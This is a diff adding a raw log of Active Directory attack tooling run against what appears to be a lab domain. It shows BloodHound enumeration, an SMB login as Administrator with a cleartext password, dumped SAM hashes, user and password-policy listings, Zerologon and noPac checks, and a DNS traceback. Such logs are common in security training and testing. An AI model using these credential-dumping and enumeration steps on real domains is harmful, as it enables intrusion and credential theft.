@@ -1,0 +1,114 @@
+
+INFO: Found AD domain: sjlab.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (ws2k19-dc01.sjlab.local:88)] [Errno -3] Temporary failure in name resolution
+INFO: Connecting to LDAP server: ws2k19-dc01.sjlab.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 3 computers
+INFO: Connecting to LDAP server: ws2k19-dc01.sjlab.local
+INFO: Found 15 users
+INFO: Found 55 groups
+INFO: Found 4 gpos
+INFO: Found 6 ous
+INFO: Found 22 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: SJ-21317503-W10.sjlab.local
+INFO: Querying computer: SJ-21317503-W7.sjlab.local
+INFO: Querying computer: WS2K19-DC01.sjlab.local
+INFO: Done in 00M 28S
+
+SMB                      192.168.20.12   445    WS2K19-DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:WS2K19-DC01) (domain:sjlab.local) (signing:True) (SMBv1:False)
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] sjlab.local\Administrator:Test@123 (Pwn3d!)
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] Dumping SAM hashes
+SMB                      192.168.20.12   445    WS2K19-DC01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:64cbb76dcafe2e977794f6251f8231fb:::
+SMB                      192.168.20.12   445    WS2K19-DC01      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB                      192.168.20.12   445    WS2K19-DC01      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] Added 3 SAM hashes to the database
+
+ERROR:root:SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+
+SMB                      192.168.20.12   445    WS2K19-DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:WS2K19-DC01) (domain:sjlab.local) (signing:True) (SMBv1:False)
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] sjlab.local\Administrator:Test@123 (Pwn3d!)
+SMB                      192.168.20.12   445    WS2K19-DC01      -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB                      192.168.20.12   445    WS2K19-DC01      Administrator                 2024-04-26 01:58:27 0       Built-in account for administering the computer/domain
+SMB                      192.168.20.12   445    WS2K19-DC01      Guest                         <never>             0       Built-in account for guest access to the computer/domain
+SMB                      192.168.20.12   445    WS2K19-DC01      krbtgt                        2024-04-26 02:27:20 0       Key Distribution Center Service Account
+SMB                      192.168.20.12   445    WS2K19-DC01      lab.user1                     <never>             0
+SMB                      192.168.20.12   445    WS2K19-DC01      lab.user2                     <never>             0
+SMB                      192.168.20.12   445    WS2K19-DC01      tester                        2024-05-03 16:50:18 0
+SMB                      192.168.20.12   445    WS2K19-DC01      hacker                        2024-05-03 16:54:24 0
+SMB                      192.168.20.12   445    WS2K19-DC01      PeterParker                   <never>             0
+SMB                      192.168.20.12   445    WS2K19-DC01      brucewayne                    <never>             0
+SMB                      192.168.20.12   445    WS2K19-DC01      dianaprince                   <never>             0
+SMB                      192.168.20.12   445    WS2K19-DC01      misconfig                     <never>             0
+SMB                      192.168.20.12   445    WS2K19-DC01      SQLService                    2024-05-03 05:24:07 0       Password is Password@1
+SMB                      192.168.20.12   445    WS2K19-DC01      tonystark                     2024-05-03 08:34:34 0
+SMB                      192.168.20.12   445    WS2K19-DC01      james                         2024-10-10 16:43:16 0
+SMB                      192.168.20.12   445    WS2K19-DC01      [*] Enumerated 14 local users: SJLAB
+
+
+SMB                      192.168.20.12   445    WS2K19-DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:WS2K19-DC01) (domain:sjlab.local) (signing:True) (SMBv1:False)
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] sjlab.local\Administrator:Test@123 (Pwn3d!)
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] Dumping password info for domain: SJLAB
+SMB                      192.168.20.12   445    WS2K19-DC01      Minimum password length: 7
+SMB                      192.168.20.12   445    WS2K19-DC01      Password history length: 24
+SMB                      192.168.20.12   445    WS2K19-DC01      Maximum password age: 41 days 23 hours 53 minutes
+SMB                      192.168.20.12   445    WS2K19-DC01      
+SMB                      192.168.20.12   445    WS2K19-DC01      Password Complexity Flags: 000001
+SMB                      192.168.20.12   445    WS2K19-DC01         Domain Refuse Password Change: 0
+SMB                      192.168.20.12   445    WS2K19-DC01         Domain Password Store Cleartext: 0
+SMB                      192.168.20.12   445    WS2K19-DC01         Domain Password Lockout Admins: 0
+SMB                      192.168.20.12   445    WS2K19-DC01         Domain Password No Clear Change: 0
+SMB                      192.168.20.12   445    WS2K19-DC01         Domain Password No Anon Change: 0
+SMB                      192.168.20.12   445    WS2K19-DC01         Domain Password Complex: 1
+SMB                      192.168.20.12   445    WS2K19-DC01      
+SMB                      192.168.20.12   445    WS2K19-DC01      Minimum password age: 1 day 4 minutes
+SMB                      192.168.20.12   445    WS2K19-DC01      Reset Account Lockout Counter: 10 minutes
+SMB                      192.168.20.12   445    WS2K19-DC01      Locked Account Duration: 10 minutes
+SMB                      192.168.20.12   445    WS2K19-DC01      Account Lockout Threshold: None
+SMB                      192.168.20.12   445    WS2K19-DC01      Forced Log off Time: Not Set
+
+
+SMB                      192.168.20.12   445    WS2K19-DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:WS2K19-DC01) (domain:sjlab.local) (signing:True) (SMBv1:False)
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] sjlab.local\Administrator:Test@123 (Pwn3d!)
+ZEROLOGON                192.168.20.12   445    WS2K19-DC01      Attack failed. Target is probably patched.
+
+
+SMB                      192.168.20.12   445    WS2K19-DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:WS2K19-DC01) (domain:sjlab.local) (signing:True) (SMBv1:False)
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] sjlab.local\Administrator:Test@123 (Pwn3d!)
+NOPAC                    192.168.20.12   445    WS2K19-DC01      TGT with PAC size 1670
+NOPAC                    192.168.20.12   445    WS2K19-DC01      TGT without PAC size 1670
+
+
+
+Traceback (most recent call last):
+  File "/usr/bin/bloodhound-python", line 33, in <module>
+    sys.exit(load_entry_point('bloodhound==1.7.2', 'console_scripts', 'bloodhound-python')())
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/bloodhound/__init__.py", line 308, in main
+    ad.dns_resolve(domain=args.domain, options=args)
+  File "/usr/lib/python3/dist-packages/bloodhound/ad/domain.py", line 698, in dns_resolve
+    q = self.dnsresolver.query(query, 'SRV', tcp=self.dns_tcp)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1364, in query
+    return self.resolve(
+           ^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1321, in resolve
+    timeout = self._compute_timeout(start, lifetime, resolution.errors)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1075, in _compute_timeout
+    raise LifetimeTimeout(timeout=duration, errors=errors)
+dns.resolver.LifetimeTimeout: The resolution lifetime expired after 3.104 seconds: Server Do53:192.168.20.12@53 answered The DNS operation timed out.
+
+
+
+
+
+
+
+
+
+
+
